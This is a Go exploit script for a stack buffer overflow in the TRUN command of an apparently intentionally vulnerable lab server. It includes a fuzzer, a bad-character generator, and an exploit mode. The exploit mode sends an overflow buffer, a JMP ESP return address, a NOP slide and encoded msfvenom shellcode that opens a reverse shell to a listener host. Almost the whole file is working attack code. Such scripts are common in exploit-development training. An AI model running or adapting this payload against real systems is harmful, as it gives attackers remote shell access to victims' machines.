package main

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/sirupsen/logrus"
)

type opts struct {
	mode             string
	ip               string
	port             string
	badBytes         []byte
	fuzzMaxByteSize  int
	fuzzByteStepping int
}

func main() {
	o := &opts{
		mode:             "exploit",
		ip:               "10.10.10.10",
		port:             "9999",
		badBytes:         []byte{0x00},
		fuzzMaxByteSize:  10000,
		fuzzByteStepping: 100,
	}

	switch o.mode {
	case "exploit":
		o.exploit()
	case "fuzz":
		o.fuzz()
	case "excludebadchars":
		o.excludeBadChars()
	default:
		logrus.Fatal("No operation mode selected")
	}
}

func (o *opts) exploit() {
	conn, err := net.DialTimeout("tcp", o.ip+":"+o.port, time.Second*5)
	if err != nil {
		logrus.Fatal(err)
	}
	defer conn.Close()

	logrus.Infof("Connection to %s:%s established", o.ip, o.port)

	buffer := strings.Repeat("\x41", 2006)
	// 0x62501205 - FFE4 - JMP ESP from essfunc.dll
	ret := "\x05\x12\x50\x62"
	nopslide := strings.Repeat("\x90", 16)
	// msfvenom LHOST=172.16.234.182 LPORT=443 -p windows/shell_reverse_tcp -f c -e x86/shikata_ga_nai EXITFUNC=thread -b "\x00"
	shellcode := "\xbb\xed\x49\x5a\xf1\xdb\xce\xd9\x74\x24\xf4\x5d\x29\xc9\xb1" +
		"\x52\x31\x5d\x12\x83\xed\xfc\x03\xb0\x47\xb8\x04\xb6\xb0\xbe" +
		"\xe7\x46\x41\xdf\x6e\xa3\x70\xdf\x15\xa0\x23\xef\x5e\xe4\xcf" +
		"\x84\x33\x1c\x5b\xe8\x9b\x13\xec\x47\xfa\x1a\xed\xf4\x3e\x3d" +
		"\x6d\x07\x13\x9d\x4c\xc8\x66\xdc\x89\x35\x8a\x8c\x42\x31\x39" +
		"\x20\xe6\x0f\x82\xcb\xb4\x9e\x82\x28\x0c\xa0\xa3\xff\x06\xfb" +
		"\x63\xfe\xcb\x77\x2a\x18\x0f\xbd\xe4\x93\xfb\x49\xf7\x75\x32" +
		"\xb1\x54\xb8\xfa\x40\xa4\xfd\x3d\xbb\xd3\xf7\x3d\x46\xe4\xcc" +
		"\x3c\x9c\x61\xd6\xe7\x57\xd1\x32\x19\xbb\x84\xb1\x15\x70\xc2" +
		"\x9d\x39\x87\x07\x96\x46\x0c\xa6\x78\xcf\x56\x8d\x5c\x8b\x0d" +
		"\xac\xc5\x71\xe3\xd1\x15\xda\x5c\x74\x5e\xf7\x89\x05\x3d\x90" +
		"\x7e\x24\xbd\x60\xe9\x3f\xce\x52\xb6\xeb\x58\xdf\x3f\x32\x9f" +
		"\x20\x6a\x82\x0f\xdf\x95\xf3\x06\x24\xc1\xa3\x30\x8d\x6a\x28" +
		"\xc0\x32\xbf\xff\x90\x9c\x10\x40\x40\x5d\xc1\x28\x8a\x52\x3e" +
		"\x48\xb5\xb8\x57\xe3\x4c\x2b\xf4\xe4\xa4\x1d\x6c\x07\x38\x63" +
		"\xd6\x8e\xde\x09\x38\xc7\x49\xa6\xa1\x42\x01\x57\x2d\x59\x6c" +
		"\x57\xa5\x6e\x91\x16\x4e\x1a\x81\xcf\xbe\x51\xfb\x46\xc0\x4f" +
		"\x93\x05\x53\x14\x63\x43\x48\x83\x34\x04\xbe\xda\xd0\xb8\x99" +
		"\x74\xc6\x40\x7f\xbe\x42\x9f\xbc\x41\x4b\x52\xf8\x65\x5b\xaa" +
		"\x01\x22\x0f\x62\x54\xfc\xf9\xc4\x0e\x4e\x53\x9f\xfd\x18\x33" +
		"\x66\xce\x9a\x45\x67\x1b\x6d\xa9\xd6\xf2\x28\xd6\xd7\x92\xbc" +
		"\xaf\x05\x03\x42\x7a\x8e\x23\xa1\xae\xfb\xcb\x7c\x3b\x46\x96" +
		"\x7e\x96\x85\xaf\xfc\x12\x76\x54\x1c\x57\x73\x10\x9a\x84\x09" +
		"\x09\x4f\xaa\xbe\x2a\x5a"
	padding := strings.Repeat("\x43", 100)
	// Target Windows 7 Pro SP1 x86 - German
	payload := "TRUN ." + buffer + ret + nopslide + shellcode + padding

	logrus.Infof("Sending payload %d bytes", len(payload))
	fmt.Fprintf(conn, payload) // sends the payload

	if err != nil {
		logrus.Fatal(err)
	}

	logrus.Infoln("Done. Check your reverse shell listener")
}

func (o *opts) fuzz() {
	conn, err := net.DialTimeout("tcp", o.ip+":"+o.port, time.Second*5)
	if err != nil {
		logrus.Fatal(err)
	}
	defer conn.Close()

	logrus.Infof("Connection to %s:%s established", o.ip, o.port)

	for i := 0; i <= o.fuzzMaxByteSize; i += o.fuzzByteStepping {
		cmd := "TRUN ."
		payload := strings.Repeat("\x41", i)

		logrus.Infof("Send payload %d bytes", len(payload))
		fmt.Fprintf(conn, cmd+payload)
		bufio.NewReader(conn).ReadByte()
	}

	logrus.Infoln("Fuzzing done")
}

func (o *opts) excludeBadChars() {
	var validChars string
	for b := 0x0; b <= 0xFF; b++ {
		if !bytes.Contains(o.badBytes, append([]byte{}, byte(b))) {
			validChars += fmt.Sprintf("\\x%02x", b)
		}
	}

	logrus.Printf(validChars)
}
